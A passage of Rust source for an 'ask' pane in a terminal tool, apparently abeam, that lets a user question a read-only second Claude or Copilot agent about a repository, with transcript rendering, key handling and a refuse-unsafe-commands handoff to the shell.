            AskEvent::Ended => {
                if !self.ended {
                    self.ended = true;
                    self.note(
                        "the reader has gone. Asking again starts a fresh one, \
                         which will not remember this conversation — nothing \
                         here is persisted, by design."
                            .to_string(),
                    );
                }
            }
            AskEvent::Broke(why) => self.note(format!("abeam could not read a line: {why}")),
        }
    }

    /// One thing abeam has to say about this conversation, in the transcript
    /// where the rest of it is.
    ///
    /// `pub(crate)` for the app, which owns the child and is therefore the only
    /// party that can see the three things this pane cannot: a `claude` that
    /// would not start, a question that could not be written to the pipe, and a
    /// shell that would not take a command it was handed. Each of those happens
    /// *between* two answers, which is what an entry is for and what a status
    /// line would misdate.
    pub(crate) fn note(&mut self, text: String) {
        // Counted rather than repeated when it is the same sentence again, and
        // *only* when it is the one immediately before: two identical warnings
        // with an answer between them are two things that happened, and
        // collapsing those would misdate the second. See [`Entry::Note`].
        match self.entries.last_mut() {
            Some(Entry::Note { text: said, count }) if *said == text => *count += 1,
            _ => self.entries.push(Entry::Note { text, count: 1 }),
        }
        self.bump();
    }

    /// The exchange a progress event belongs to: the newest one, if it is still
    /// running.
    ///
    /// `None` once the `result` has arrived, which is what keeps a late tool
    /// call from reopening a finished turn — the pane would draw a spinner
    /// under an answer that was complete, for a turn that had ended.
    fn working(&mut self) -> Option<&mut Exchange> {
        let at = self.open_exchange()?;
        match &mut self.entries[at] {
            Entry::Exchange(x) if !x.done => Some(x),
            _ => None,
        }
    }

    /// Where the answer that is arriving belongs.
    ///
    /// An index rather than a `&mut Exchange`, and that is a borrow-checker
    /// fact rather than a preference: the caller's other arm pushes onto
    /// `entries`, and a borrow taken by the scrutinee of a `match` is live for
    /// the whole of it.
    fn open_exchange(&self) -> Option<usize> {
        self.entries
            .iter()
            .rposition(|e| matches!(e, Entry::Exchange(_)))
    }

    /// The transcript changed, so the cached rows and the scanned commands are
    /// both a revision behind. One counter for both, because they are both
    /// functions of the same document.
    fn bump(&mut self) {
        self.revision += 1;
        self.owed = true;
    }

    /// Is the newest exchange still open?
    ///
    /// The newest *exchange*, and not the newest entry, because a note can
    /// arrive in the middle of a turn and two of them routinely do: a rate limit
    /// and a line the reader could not parse both land while an answer is
    /// streaming. Asked of `entries.last()` this flipped the title from
    /// `answering` to `1 turn` mid-answer, and told [`AskPane::submit`] the
    /// conversation was idle when it was not.
    fn streaming(&self) -> bool {
        matches!(
            self.open_exchange().map(|i| &self.entries[i]),
            Some(Entry::Exchange(x)) if !x.done
        )
    }

    fn turns(&self) -> usize {
        self.entries
            .iter()
            .filter(|e| matches!(e, Entry::Exchange(_)))
            .count()
    }

    fn cost(&self) -> f64 {
        self.entries
            .iter()
            .filter_map(|e| match e {
                Entry::Exchange(x) => x.cost_usd,
                Entry::Note { .. } => None,
            })
            .sum()
    }

    // --- keys -------------------------------------------------------------

    /// The half of `crate::scroll`'s table a live composer leaves free.
    ///
    /// Spelled out rather than handed to [`Scroll::key`] whole, for the reason
    /// `viewer::search_key` gives: a box that takes typing cannot also read `j`
    /// as "down", and offering the vocabulary unfiltered would turn the first
    /// word of half the questions anybody asks into a scroll.
    ///
    /// `Home` and `End` are in rather than out, which is worth a sentence
    /// because in most text boxes they are cursor keys. This composer has no
    /// cursor to move — it appends, as `queue`'s does — so they are free, and
    /// they are the only way back to the top of a long transcript once `g` is a
    /// letter.
    ///
    /// `None` for a key this has no opinion about, so the arms below can match
    /// their own — and so `Esc` reaches the one place that decides what it
    /// means here.
    fn scroll_only(&mut self, key: KeyEvent) -> Option<Handled> {
        let ctrl = key.modifiers.contains(KeyModifiers::CONTROL);
        let free = match key.code {
            KeyCode::Up | KeyCode::Down | KeyCode::PageUp | KeyCode::PageDown => true,
            KeyCode::Home | KeyCode::End => true,
            KeyCode::Char('d') | KeyCode::Char('u') => ctrl,
            _ => false,
        };
        if !free {
            return None;
        }
        let handled = self.scroll.key(key)?;
        self.settle_follow();
        Some(handled)
    }

    /// Whether the reader is at the end of the transcript, which is the whole
    /// of what "following" means.
    ///
    /// Derived rather than remembered, so there is no state that can disagree
    /// with the scrollbar: `End` re-arms it, one line up breaks it, and
    /// scrolling back down to the bottom by hand resumes it without needing a
    /// key of its own.
    fn settle_follow(&mut self) {
        self.following = self.scroll.offset >= self.scroll.max();
    }

    /// `Enter` with something typed.
    ///
    /// **Refused while an answer is still arriving, and the draft survives the
    /// refusal.** Every `Delta` and every `Turn` is filed under the newest
    /// exchange — see [`AskPane::open_exchange`], which has to be the newest
    /// because that is the only thing the wire says — so a second question
    /// asked mid-stream takes delivery of the first one's remaining fragments
    /// and then of its `result`, which overwrites them; the first answer is
    /// destroyed and the title's running cost drops by a whole turn. Keying
    /// answers to the turn that produced them is the bigger fix and the honest
    /// one; this is the small one that stops the damage in the meantime, and it
    /// is a refusal rather than a queue because a question abeam is holding on
    /// to is one the reader cannot see has not gone.
    ///
    /// The composer is deliberately left alone. A refusal that also threw away
    /// what somebody had typed would be a worse failure than the one it
    /// prevents, and [`AskPane::foot`] draws the reason where they are looking
    /// for as long as it is true — the shape `command_lines` uses for the block
    /// it will not offer.
    fn submit(&mut self) -> Handled {
        let question = self.composing.trim().to_string();
        if question.is_empty() {
            return Handled::No;
        }
        if self.streaming() {
            // Claimed rather than declined: the key did something — it was read
            // and refused — and letting it fall through would hand `Enter` to
            // the shell, which would take it as "done with this pane".
            return Handled::Yes;
        }
        self.composing.clear();
        // Consumed by the question it rides on. A context that outlived its
        // send would attach itself to the *next* question as well, silently,
        // and the row above the composer would be describing something the
        // reader had already used.
        let path = self
            .context
            .take()
            .map(|ctx| ctx.path.display().to_string());
        // The path goes under the question on a line of its own, and nothing
        // else is added. Any framing sentence of abeam's would be text the
        // reader cannot see in the row that claims to show what was sent.
        self.pending = Some(match &path {
            Some(p) => format!("{question}\n\n{p}"),
            None => question.clone(),
        });
        self.entries.push(Entry::Exchange(Exchange {
            question,
            path,
            // Stamped here rather than on the first thing the child says,
            // because what the reader is timing starts when they press `Enter`.
            // The two are two and a half seconds apart on a measured turn, and
            // those are the seconds where the pane looks emptiest.
            started: Some(Instant::now()),
            ..Exchange::default()
        }));
        // A question you asked is a thing you are waiting to see.
        self.following = true;
        self.bump();
        Handled::Yes
    }

    /// `Enter` with nothing typed: hand the selected command to the shell.
    fn hand_over(&mut self) -> Handled {
        let Some(command) = self.selected_command() else {
            // Nothing to hand over, so nothing was acted on — and the row above
            // the composer already says whether that is because there are no
            // commands or because the ones there are span several lines.
            return Handled::No;
        };
        self.handoff = Some(command);
        Handled::Yes
    }

    fn step_command(&mut self, delta: isize) -> Handled {
        let n = self.commands.len();
        if n < 2 {
            return Handled::No;
        }
        let to = (((self.from_end as isize + delta) % n as isize) + n as isize) % n as isize;
        self.from_end = to as usize;
        Handled::Yes
    }

    /// Which command `Enter` would hand over, as an index into `commands`.
    ///
    /// One place, read by the key and by the row that draws it, so the number
    /// on screen and the string that leaves cannot come from two different
    /// pieces of arithmetic — the same discipline
    /// `QueuePane::notice_rows` keeps for a row offset.
    fn chosen(&self) -> Option<usize> {
        let n = self.commands.len();
        let from_end = self.from_end.min(n.checked_sub(1)?);
        Some(n - 1 - from_end)
    }

    fn selected_command(&self) -> Option<String> {
        self.commands.get(self.chosen()?).cloned()
    }

    // --- the transcript ---------------------------------------------------

    /// The whole transcript as one markdown document.
    ///
    /// One document rather than one per turn, so there is one wrapping model
    /// and no seam down the middle of something a reader scrolls through as a
    /// single thing. The question goes in as a block quote — which is where the
    /// renderer's gutter comes from, and the only decoration that survives a
    /// forty-six-column pane — and the answer goes in verbatim, because it
    /// already is markdown and anything done to it here would be abeam editing
    /// the child's words.
    fn source(&self) -> String {
        if self.entries.is_empty() {
            return self.opening();
        }
        let mut out = String::new();
        for entry in &self.entries {
            match entry {
                Entry::Exchange(x) => {
                    for line in x.question.lines() {
                        out.push_str("> ");
                        out.push_str(line);
                        out.push('\n');
                    }
                    if let Some(path) = &x.path {
                        out.push_str(">\n> ");
                        out.push_str(ATTACHED);
                        out.push('`');
                        out.push_str(path);
                        out.push_str("`\n");
                    }
                    out.push('\n');
                    // What it is doing, above the answer rather than below it,
                    // because while the turn is running this is the only thing
                    // on screen that is moving — and after it, it reads as the
                    // working that produced what follows.
                    if let Some(doing) = self.activity(x) {
                        out.push_str(&doing);
                        out.push_str("\n\n");
                    }
                    if x.answer.trim().is_empty() {
                        // Never nothing. A question with a blank space under it
                        // is indistinguishable from a pane that has stopped
                        // working, and this is the state every question passes
                        // through.
                        out.push_str(if x.done {
                            "*nothing came back*\n\n"
                        } else {
                            "*…*\n\n"
                        });
                    } else {
                        out.push_str(x.answer.trim_end());
                        out.push_str("\n\n");
                    }
                    if let Some(why) = &x.error {
                        out.push_str("> [!CAUTION]\n> ");
                        out.push_str(&one_line(why));
                        out.push_str("\n\n");
                    }
                    // Per turn and not only in total, because the total in the
                    // title cannot say which question was the expensive one —
                    // and the same is true of the slow one, which is why the
                    // duration keeps it company here rather than anywhere else.
                    if let Some(spent) = spent(x) {
                        out.push_str(&format!("`{spent}`\n\n"));
                    }
                }
                Entry::Note { text, count } => {
                    out.push_str("> [!WARNING]\n> ");
                    out.push_str(&one_line(text));
                    if *count > 1 {
                        // The rule that nothing is dropped, kept without the
                        // transcript being buried by a failure that repeats.
                        out.push_str(&format!(" (×{count})"));
                    }
                    out.push_str("\n\n");
                }
            }
        }
        out
    }

    /// What the child is doing, or did, as one line of the document — or `None`
    /// for a turn that has not needed to do anything.
    ///
    /// **One line and not one per step**, which is the whole shape of this and
    /// the thing to reconsider first if it ever needs changing. A question that
    /// takes thirty seconds runs six or eight tools; a list of them would be
    /// eight rows above every answer in a pane forty-six columns wide, and a
    /// transcript of four exchanges would be more scaffolding than answer. As a
    /// sentence it wraps to two or three rows, keeps every target, and reads as
    /// what it is — a note about how the answer was arrived at.
    ///
    /// Kept after the turn rather than collapsed to a count, because *which
    /// files it read* is the question a reader has about an answer they are not
    /// sure they trust, and a summary saying `Read ×3` answers a question
    /// nobody asked.
    ///
    /// Every step is a code span, and that is not decoration: a `Glob` target
    /// is `crates/abeam/src/**/*.rs`, and a pair of asterisks loose in a
    /// markdown paragraph starts emphasis that swallows the rest of the line.
    /// Inside a span they are literal — and a backtick in a target, which would
    /// end the span early, is replaced rather than escaped, because what this
    /// line is for is being glanceable rather than being a faithful copy of an
    /// argument the answer above already quotes.
    fn activity(&self, x: &Exchange) -> Option<String> {
        if x.steps.is_empty() && !x.thinking {
            return None;
        }
        let mut said: Vec<String> = x.steps.iter().map(|step| self.step(step)).collect();
        if x.thinking {
            said.push("*thinking…*".to_string());
        }
        // The leader is only there while it means something. `⋯` on a finished
        // turn would read as an answer that is still coming.
        let lead = if x.done { "" } else { "⋯ " };
        Some(format!("{lead}{}", said.join(" · ")))
    }

    /// One tool call as a code span: what ran, and to what.
    fn step(&self, step: &Step) -> String {
        let mut said = step.tool.replace('`', "'");
        if let Some(target) = &step.target {
            said.push(' ');
            said.push_str(&self.shorten(target));
        }
        format!("`{said}`")
    }

    /// A tool's argument as it is worth reading in a narrow pane.
    ///
    /// The repository root comes off the front, because every path the child
    /// reports is absolute and in a pane this wide
    /// `C:\Users\someone\src\project\` is the part that is the same on every
    /// line and never the part being read. What is left is the path as the
    /// reader thinks of it, which is also how the answer above will name it.
    fn shorten(&self, target: &str) -> String {
        let root = self.root.display().to_string();
        let shown = target
            .strip_prefix(&root)
            .map(|rest| rest.trim_start_matches(['/', '\\']))
            .filter(|rest| !rest.is_empty())
            .unwrap_or(target);
        clip(&one_line(shown), 80).replace('`', "'")
    }

    /// How long the reader has been waiting on the turn that is running, in
    /// whole seconds — or `None` when nothing is.
    ///
    /// abeam's own clock, because this has to answer while the turn is in
    /// flight and nothing on the wire says how long it has been. The child's
    /// own measurement arrives on the `result` line, which is thirty seconds
    /// after the reader started wondering, and is what the finished turn is
    /// labelled with.
    fn elapsed(&self) -> Option<u64> {
        match self.open_exchange().map(|at| &self.entries[at]) {
            Some(Entry::Exchange(x)) if !x.done => Some(x.started?.elapsed().as_secs()),
            _ => None,
        }
    }

    /// The transcript as the document it is drawn from.
    ///
    /// For the tests in `crate::app`, which put notes in here through
    /// [`AskPane::note`] and have to be able to read one back: a note wraps, and
    /// a phrase read off a flattened frame buffer is a phrase that breaks at
    /// whatever column the pane happened to be. Nothing outside a test wants
    /// this — the pane draws itself.
    #[cfg(test)]
    pub(crate) fn transcript(&self) -> String {
        self.source()
    }

    /// What an empty pane says. Never nothing, for `queue`'s reason: a blank
    /// box is indistinguishable from a broken one, and this pane is empty every
    /// time it is opened for the first time.
    ///
    /// It is also the one screen with room for the two sentences the chrome can
    /// only abbreviate — what the child may do, and whose quota it spends — so
    /// they are written out here in full.
    fn opening(&self) -> String {
        format!(
            "{}\n\
             \n\
             - `enter` sends what you have typed; `ctrl+enter` starts a new line \
             inside it.\n\
             - `ctrl+l` ends the conversation and starts a fresh one. Worth \
             doing when you move to another file: everything said so far is \
             sent again as context on the next question, so a conversation left \
             open is one you keep paying for.\n\
             - `tab` picks a command out of an answer, and `enter` on an empty \
             box types it into the shell **without running it**. A block of more \
             than one line, or one carrying a control character, is never \
             offered: a command abeam had to rewrite to send is a command \
             nobody read.\n\
             - `esc` clears what you have typed, and hands focus back once there \
             is nothing left to clear.\n\
             - `↑ ↓ pgup pgdn home end` move the transcript. The letters are \
             letters in here, because this is a box you type into.\n\
             \n\
             Nothing is remembered between sessions, and closing abeam ends the \
             conversation.\n\
             \n\
             It reads `{}`\n",
            self.what_it_is(),
            self.root.display()
        )
    }

    /// The paragraph the opening screen leads with, which is the one thing on
    /// that screen the two agents cannot share.
    ///
    /// Long for Copilot, and deliberately: this is the only place with room for
    /// the two sentences the chrome can only abbreviate, and against Copilot
    /// there are two *more* — what the capability row cannot show, and that none
    /// of this has been run. A reader who leans on the pane's read-only promise
    /// should learn from the pane which of the two versions of that promise they
    /// have, rather than from a README.
    ///
    /// The unavailable case never reaches here: `AskPane::build` draws the
    /// reason instead of the transcript, so [`AskPane::opening`] is only ever
    /// asked of a pane that resolved something.
    fn what_it_is(&self) -> &'static str {
        match self.flavour() {
            Some(Flavour::Copilot) => {
                "Ask a second Copilot about what is in front of you. Each \
                 question is one `copilot -p`, resuming a session of its own so \
                 that it remembers the last, and abeam refuses it `shell`, \
                 `write`, `edit`, `web_fetch` and `web_search` — so it has no \
                 tool that can change a file and none that reaches the network.\n\
                 \n\
                 **Three things are weaker here than in the Claude version of \
                 this pane, and they are worth knowing before you lean on it.** \
                 Copilot publishes no line announcing what it was given, so the \
                 row along the bottom cannot show you the tools it actually got \
                 — abeam can tell you what it asked for and not what was \
                 granted. It publishes no cost or duration either, so a finished \
                 turn is not labelled with what it cost. And **none of this has \
                 ever been run**: the flags come from GitHub's documentation \
                 rather than from a session anybody watched. A repository's own \
                 instructions file, and any MCP server you have configured, \
                 still load.\n\
                 \n\
                 The conversation is a named session, so it is in your own \
                 `copilot --resume` list afterwards, under `abeam-ask-`."
            }
            // Claude, which is also what an unavailable pane would say if it
            // ever drew this — and it never does.
            _ => {
                "Ask a second Claude about what is in front of you. It can read \
                 this repository — `Read`, `Grep` and `Glob`, and the row along \
                 the bottom is the list it actually got — and it has no tool \
                 that can change a file."
            }
        }
    }

    /// Rebuild the commands the transcript is offering, if the transcript has
    /// moved on.
    ///
    /// Through the same parser and the same options the renderer uses, which is
    /// what makes "the blocks abeam offers" and "the blocks abeam drew" one set
    /// rather than two that can disagree. A hand-rolled scan for ``` would
    /// differ from the rendering the first time somebody nested a fence inside
    /// a list, and the difference would be a command offered out of something
    /// that is not on screen.
    fn sync(&mut self) {
        if self.scanned == Some(self.revision) {
            return;
        }
        self.scanned = Some(self.revision);
        self.commands.clear();
        self.skipped = 0;
        for entry in &self.entries {
            if let Entry::Exchange(x) = entry {
                scan(&x.answer, &mut self.commands, &mut self.skipped);
            }
        }
        // Counted from the end, so a list that grew keeps the newest selected
        // and one that shrank cannot leave the selection past its end.
        self.from_end = self.from_end.min(self.commands.len().saturating_sub(1));
    }

    /// Lay the transcript out for `width`, if it is not already.
    ///
    /// The one place `lines` is rebuilt. Everything that changes the document
    /// says so by bumping the revision and then waits for this, so a streaming
    /// answer costs one layout per *frame* rather than one per delta.
    fn ensure_layout(&mut self, width: usize) {
        if self.laid_rev == Some(self.revision) && width == self.laid_out {
            return;
        }
        #[cfg(test)]
        {
            self.builds += 1;
        }
        self.lines = self.build(width);
        self.laid_out = width;
        self.laid_rev = Some(self.revision);
    }

    fn build(&self, width: usize) -> Vec<Line<'static>> {
        if width == 0 {
            return Vec::new();
        }
        let t = self.theme.theme();
        match self.ready() {
            // The whole reason, wrapped, where somebody looking for the missing
            // half will read it. The notice row above is one line of it; this
            // is the sentence that names the way through.
            Err(Unavailable(why)) => text::block(why, width, t.dim()),
            Ok(_) => markdown::render(&self.source(), width, self.theme),
        }
    }

    // --- drawing ----------------------------------------------------------

    /// Rows the unavailable notice takes off the top, and therefore the offset
    /// everything below it is drawn at.
    ///
    /// Read by `render` and by nothing that recomputes it, which is `queue`'s
    /// discipline arriving here for a slightly different reason: there are no
    /// clickable rows in this pane, but the body's height is what
    /// [`Scroll::measure`] is told, and a viewport a row taller than what was
    /// drawn means `G` stops one line short of the end for ever.
    fn notice_rows(&self) -> u16 {
        u16::from(self.ready().is_err())
    }

    /// Everything drawn below the transcript, top to bottom, ending with the
    /// composer.
    ///
    /// One function so that the height the body is given and the height the
    /// foot is drawn at are one number. The composer is always the last row,
    /// which is what lets [`Pane::cursor`] answer from the pane's height alone
    /// rather than from a second copy of this arithmetic.
    fn foot(&self, w: usize) -> Vec<Line<'static>> {
        if self.ready().is_err() {
            // Nothing to type into and nothing to offer. The notice and the
            // reason are the whole pane.
            return Vec::new();
        }
        let mut out = vec![self.capability_line(w)];
        out.extend(self.command_lines(w));
        // Drawn for as long as the refusal is true, rather than in answer to the
        // press that met it — `command_lines`'s rule, one row up. A message that
        // appeared only after somebody pressed `Enter` would arrive after they
        // had already been surprised, and the state it describes is one they can
        // see beginning: the answer is arriving above it.
        if self.streaming() {
            let t = self.theme.theme();
            let waited = match self.elapsed() {
                Some(secs) => format!(" answering {secs}s"),
                // A turn abeam has no start time for, which is a transcript
                // driven by a test rather than by a keystroke. The row still
                // has to be true.
                None => " answering".to_string(),
            };
            out.push(clip_line(
                Line::from(vec![
                    Span::styled(waited, Style::new().fg(t.accent)),
                    Span::styled(format!(" · {WAITING}"), t.dim()),
                ]),
                w,
            ));
        }
        if let Some(ctx) = &self.context {
            out.push(clip_line(
                Line::from(vec![
                    Span::styled(format!(" {ATTACHED}"), self.theme.theme().dim()),
                    Span::styled(
                        ctx.label.clone(),
                        Style::new().fg(self.theme.theme().accent),
                    ),
                ]),
                w,
            ));
        }
        out.push(self.composer_line(w));
        out
    }

    /// What the child may do, and what it costs. Always on screen while the
    /// pane is available — see the module docs on why neither half may be left
    /// to the opening screen alone.
    fn capability_line(&self, w: usize) -> Line<'static> {
        let t = self.theme.theme();
        let mut spans = vec![Span::raw(" ")];
        match (&self.tools, self.ended) {
            (_, true) => spans.push(Span::styled("ended · ask again to restart", t.dim())),
            (Some(tools), _) if !tools.is_empty() => spans.push(Span::styled(
                tools.join(" "),
                Style::new().fg(t.ok).add_modifier(Modifier::BOLD),
            )),
            // The row that cannot be the child's answer, because this child
            // never gives one. Copilot publishes no `system`/`init` line, so
            // there is nothing to show — and what abeam must not do is fill the
            // gap with `--deny-tool`'s list, which would read as a confirmation
            // and is only ever abeam's intention. Saying there is no list is the
            // one true thing available; the opening screen has the paragraph.
            _ if self.flavour() == Some(Flavour::Copilot) => {
                spans.push(Span::styled("copilot · no tool list to show", t.dim()));
            }
            // Not "read-only". Nothing has told this pane anything yet, and a
            // list printed before the child has reported one would be abeam's
            // intention wearing the child's clothes.
            _ => spans.push(Span::styled("no reader yet", t.dim())),
        }
        // Only once there is a conversation to end. Offered over an empty pane
        // it would be a key that does nothing, on the one screen whose job is
        // to teach the pane — and the opening screen lists it there anyway.
        if !self.entries.is_empty() {
            spans.push(Span::styled(" · ", t.dim()));
            spans.push(Span::styled(CLEAR, t.dim()));
        }
        clip_line(Line::from(spans), w)
    }

    /// The command `Enter` would type into the shell, or the reason there is
    /// not one.
    ///
    /// Nothing at all when the transcript has no code in it, because a row that
    /// is empty most of the time teaches a reader to stop looking at it.
    ///
    /// **This row is clipped and the hand-off is not.** A command longer than
    /// the pane is drawn with its tail cut off, and [`AskPane::hand_over`] sends
    /// the string whole — so on a narrow pane what is typed at the prompt can be
    /// longer than what this row showed. That is not the pane sending something
    /// it did not disclose: the full text is in the body above, inside the
    /// fenced block it was read out of, which is where a reader who wants all of
    /// it can see all of it. What is refused rather than clipped is the case
    /// where the two would *disagree* — several lines, or a control character —
    /// and that is [`scan`]'s subject.
    fn command_lines(&self, w: usize) -> Vec<Line<'static>> {
        let t = self.theme.theme();
        let (Some(at), Some(command)) = (self.chosen(), self.selected_command()) else {
            if self.skipped == 0 {
                return Vec::new();
            }
            // The refusal, whole. This is the state a reader reaches by
            // pressing `tab` and getting nothing, so it is the one state where
            // the sentence is worth three rows of a narrow pane — and the last
            // clause is the way through.
            //
            // Clipped as well as wrapped, because `text::block` fits words to a
            // width and a word longer than the pane is one it cannot fit. A row
            // wider than its rect corrupts the frame.
            return text::block(&refusal(self.skipped), w, t.dim())
                .into_iter()
                .map(|line| clip_line(line, w))
                .collect();
        };

        let count = format!(" · {}/{}", at + 1, self.commands.len());
        let skipped = if self.skipped == 0 {
            String::new()
        } else {
            format!(" · {} not offered", self.skipped)
        };
        let lead = format!(" {COMMAND}");
        let budget = w
            .saturating_sub(lead.width())
            .saturating_sub(count.width())
            .saturating_sub(skipped.width());
        vec![clip_line(
            Line::from(vec![
                Span::styled(lead, t.dim()),
                Span::styled(clip(&command, budget), t.selection()),
                Span::styled(count, t.dim()),
                Span::styled(skipped, t.dim()),
            ]),
            w,
        )]
    }

    fn composer_line(&self, w: usize) -> Line<'static> {
        let t = self.theme.theme();
        let (shown, _) = self.composer_view(w);
        clip_line(
            Line::from(vec![
                Span::styled(PROMPT, t.dim()),
                Span::styled(shown, Style::new().fg(t.fg)),
            ]),
            w,
        )
    }

    /// The draft as it fits on one row, and the column the cursor sits in.
    ///
    /// Elided from the *left*, because the end of the draft is where the typing
    /// is happening, and one cell is held back for the cursor or it would sit
    /// outside the pane on a full row. `queue`'s composer, to the letter: two
    /// boxes in one program that scroll differently are two boxes to learn.
    fn composer_view(&self, w: usize) -> (String, usize) {
        let line = self.composing.rsplit('\n').next().unwrap_or_default();
        let avail = w.saturating_sub(PROMPT.width());
        let shown = elide_left(line, avail.saturating_sub(1));
        let col = PROMPT.width() + shown.width();
        (shown, col)
    }
}

impl Pane for AskPane {
    /// Clipped from the right in a forty-six-column pane, so it leads with the
    /// two things worth the last few columns: that this is the ask, and whether
    /// it is in the middle of saying something.
    fn title(&self) -> String {
        if self.ready().is_err() {
            return "ask · unavailable".to_string();
        }
        let turns = self.turns();
        if turns == 0 {
            return "ask".to_string();
        }
        let mut t = if self.streaming() {
            "ask · answering".to_string()
        } else {
            format!("ask · {turns} {}", plural(turns, "turn", "turns"))
        };
        let cost = self.cost();
        if cost > 0.0 {
            // Three places rather than two. A trivial exchange is a few
            // hundredths of a dollar, and a title reporting `$0.00` for
            // something that cost money is worse than one reporting nothing.
            t.push_str(&format!(" · ${cost:.3}"));
        }
        t
    }

    fn render(&mut self, f: &mut Frame, inner: Rect) {
        self.drawn = inner;
        if inner.width == 0 || inner.height == 0 {
            // The rows that exist, in a viewport of nothing. `measure(0, 0)`
            // would throw the reader's place away on a frame where the pane
            // was momentarily squeezed to nothing, which is a window drag.
            self.scroll.measure(self.lines.len(), 0);
            return;
        }
        self.sync();
        let t = self.theme.theme();
        // One fill for the whole rect, the scrollbar column included. ratatui
        // styles are patches, so every span drawn on top inherits this
        // background and a blank row keeps both halves — which is what makes
        // the renderer's absolute colours land on the page they were measured
        // against. See `viewer::theme`.
        f.render_widget(Block::new().style(t.base()), inner);

        let mut area = inner;
        // Above the body rather than below it, for `queue`'s reason: a pane
        // that cannot work at all has to say so where somebody looking for it
        // will read it, and the bottom of a scrolled document is not that
        // place.
        if let Err(Unavailable(why)) = self.ready() {
            let line = clip_line(
                Line::from(vec![
                    Span::styled(
                        " ask unavailable · ",
                        Style::new().fg(t.danger).add_modifier(Modifier::BOLD),
                    ),
                    Span::styled(one_line(why), t.dim()),
                ]),
                area.width as usize,
            );
            f.render_widget(Paragraph::new(line), Rect { height: 1, ..area });
        }
        let notice = self.notice_rows().min(area.height);
        area.y += notice;
        area.height -= notice;
        if area.height == 0 {
            // The rows that exist, in a viewport of nothing. `measure(0, 0)`
            // would throw the reader's place away on a frame where the pane
            // was momentarily squeezed to nothing, which is a window drag.
            self.scroll.measure(self.lines.len(), 0);
            return;
        }

        // The foot keeps its last rows when there is not room for all of them,
        // because the last row is the composer and a pane you can type into
        // with no visible composer is a pane that has swallowed your question.
        let foot = self.foot(area.width as usize);
        let keep = foot.len().min(area.height as usize);
        let foot_h = keep as u16;
        if keep > 0 {
            let rows = foot[foot.len() - keep..].to_vec();
            f.render_widget(
                Paragraph::new(rows),
                Rect {
                    y: area.y + area.height - foot_h,
                    height: foot_h,
                    ..area
                },
            );
        }

        let body = Rect {
            height: area.height - foot_h,
            ..area
        };
        // The column is reserved whether or not the bar is drawn: deciding per
        // frame would re-wrap the whole transcript every time it crossed the
        // pane height, and the text would jump sideways as it streamed.
        let text_w = body.width - scroll::bar_width(body.width);
        self.ensure_layout(text_w as usize);
        self.scroll.measure(self.lines.len(), body.height as usize);
        if self.following {
            self.scroll.to(usize::MAX);
        }
        if body.height == 0 {
            return;
        }
        let start = self.scroll.offset;
        let end = (start + body.height as usize).min(self.lines.len());
        let visible = self.lines[start.min(end)..end].to_vec();
        f.render_widget(
            Paragraph::new(visible),
            Rect {
                width: text_w,
                ..body
            },
        );
        self.scroll.render_bar(f, body);
    }

    /// A frame is owed exactly when something the child said, or something the
    /// app told this pane, changed what the next frame would show — **plus one
    /// a second while a turn is running**.
    ///
    /// Never on a bare pass of the loop otherwise. A frame re-renders the
    /// agent's whole screen, and a pane that claimed one every time it was
    /// asked would do that at the frame ceiling for a transcript nobody is
    /// adding to.
    ///
    /// The exception is the whole of the waiting problem. While an answer is
    /// streaming the deltas claim frames of their own and the counter comes
    /// along free — but the gaps that make a reader doubt the pane are exactly
    /// the ones where *no* delta arrives, because the child is thinking or
    /// three tool calls deep. One frame a second, for as long as a turn is
    /// open, is what makes the number on the composer row move through them.
    /// It stops the moment the `result` lands, because [`AskPane::elapsed`]
    /// answers `None` for a finished turn.
    fn tick(&mut self) -> bool {
        let waited = self.elapsed();
        if waited != self.ticked {
            self.ticked = waited;
            self.owed |= waited.is_some();
        }
        std::mem::take(&mut self.owed)
    }

    fn handle_key(&mut self, key: KeyEvent) -> Result<Handled> {
        // Nothing to type into, so nothing is claimed — including `Esc` and
        // `q`, which the shell then reads as "the user is done with this pane".
        // That is the only way out of an ask that cannot ask anything.
        if self.ready().is_err() {
            return Ok(Handled::No);
        }
        self.sync();
        let ctrl = key.modifiers.contains(KeyModifiers::CONTROL);
        let alt = key.modifiers.contains(KeyModifiers::ALT);

        // Before the scroll table and before the composer, because it is the
        // one binding here that has to work in every state the pane can be in —
        // mid-answer, with a draft, with nothing at all.
        //
        // `Ctrl+L` rather than a letter, for the reason every binding in this
        // pane is modified: the composer is always live, so a bare `c` is a `c`.
        // It is the key a terminal has meant "clear this" since `readline`, and
        // `Ctrl+D`/`Ctrl+U` are already scroll here, so the modified space is
        // where this pane's vocabulary lives anyway. Nothing of the hosted
        // agent's is shadowed: this arrives only when the right pane has focus,
        // which is the same exemption `w` in the git view has.
        if ctrl && !alt && matches!(key.code, KeyCode::Char('l' | 'L')) {
            self.clear();
            return Ok(Handled::Yes);
        }

        if let Some(handled) = self.scroll_only(key) {
            return Ok(handled);
        }

        Ok(match key.code {
            // Clears the draft and stays here. With nothing to clear it falls
            // through, and the shell's fallthrough is what returns the right
            // pane to whatever this view displaced and hands focus back — see
            // `crate::app::App::handle_key`. Being thrown out to the agent by
            // the key that means "never mind" is the single most annoying thing
            // a text box can do, and `queue` and `browse` both decided the same
            // thing about their own.
            KeyCode::Esc => {
                if self.composing.is_empty() {
                    Handled::No
                } else {
                    self.composing.clear();
                    Handled::Yes
                }
            }
            // A newline in the question rather than a send. It matters more
            // here than it does in the queue: a question is multi-line more
            // often than a task is, and `crate::ask` chose its whole shape so
            // that one could travel — the prompt goes to the child inside a
            // JSON string on stdin, where a newline is two ordinary bytes,
            // rather than onto a command line that cannot carry one at all.
            //
            // Windows reports the modifier on `Enter`; a terminal that folds
            // them into a bare `CR` leaves questions single-line unless they
            // are pasted, which is the same caveat `queue` records.
            KeyCode::Enter if ctrl || alt => {
                self.composing.push('\n');
                Handled::Yes
            }
            KeyCode::Enter => {
                if self.composing.trim().is_empty() {
                    self.hand_over()
                } else {
                    self.submit()
                }
            }
            KeyCode::Tab => self.step_command(1),
            KeyCode::BackTab => self.step_command(-1),
            KeyCode::Backspace => {
                // Backspacing past the start deliberately does nothing rather
                // than closing anything, because there is nothing to close: the
                // composer here is the pane.
                self.composing.pop().is_some().into()
            }
            // Ctrl plus a letter is the agent's everywhere else in this
            // program, and only the two half-page keys above are claimed inside
            // a pane. Without this arm `Ctrl+A` would be typed into the
            // question. `crate::keys::is_text` rather than `!ctrl && !alt`
            // because Ctrl *and* Alt together is how Windows reports AltGr, and
            // the pair spelt out here dropped every character behind it.
            KeyCode::Char(c) if crate::keys::is_text(&key) => {
                self.composing.push(c);
                Handled::Yes
            }
            _ => Handled::No,
        })
    }

